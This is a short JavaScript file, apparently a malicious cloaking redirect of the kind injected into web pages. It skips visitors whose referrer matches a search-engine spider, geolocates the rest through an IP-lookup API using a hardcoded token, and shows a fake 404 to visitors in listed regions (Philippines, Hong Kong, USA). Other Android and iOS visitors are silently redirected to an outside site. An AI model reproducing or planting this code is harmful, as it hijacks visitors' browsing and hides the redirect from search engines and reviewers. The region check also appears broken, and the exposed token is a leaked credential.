(function (w, d, address) {


  var  adurl = "https://www.360yyds.com/";//安卓url
  var  apurl = "https://www.360yyds.com/";//苹果url





  var ua = navigator.userAgent, app = navigator.appVersion;
  var isAndroid = ua.indexOf('Android') > -1 || ua.indexOf('Linux') > -1; // Android
  var isIOS = !!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); // ios


  if (!/(360spider|haosouspider|baiduspider|baiduspider-image|baiduspider-mobile|googlebot|Yisouspider|Sogou\sweb\spider|Sogous\sinst\sspider)/ig.test(d.referrer)) {


    window.fffff = function (rs) {
      var nowaddress = "";
      try {
        nowaddress = rs.data;
        if(typeof nowaddress == 'object' && nowaddress.length){
          nowaddress = nowaddress.join('')

        }
        console.log(nowaddress);
        debugger
      }catch (e) {}
      console.log('当前地址：',nowaddress);
      console.log('屏蔽的省份：',address);
      var count = 0;
      for(var i=0;i<address.length;i++){
        var a = address[i];
        if(nowaddress.search(a) !==-1){
          count+=1;
        }
      }
      if(count!==0){
        self["location"] = "/404.html" ;
      }else{
        if(isAndroid){
          self["location"] = adurl ;
        }else if (isIOS){
          self["location"] = apurl ;
        }else{
          self["location"] = "/404.html" ;
        }
      }
    }

    function load(callback) {
      var script = document.createElement("script")
      script.type = "text/javascript";
      if (script.readyState) {
        script.onreadystatechange = function () {
          if (script.readyState == "loaded" ||
              script.readyState == "complete") {
            script.onreadystatechange = null;
            callback();
          }
        };
      } else {
        script.onload = function () {
          callback();
        };
      }
      script.src = "https://api.ip138.com/ip/?token=6b0f0ca20206b554d2dea3b4518155a9&callback=fffff";
      (d.getElementsByTagName('body')[0]||d.getElementsByTagName('head')[0]).appendChild(script);
    };
    load();
  }
})(window, document, ['&#x83F2;&#x5F8B;&#x5BBE;,&#x9999;&#x6E2F;,&#x7F8E;&#x56FD;']);
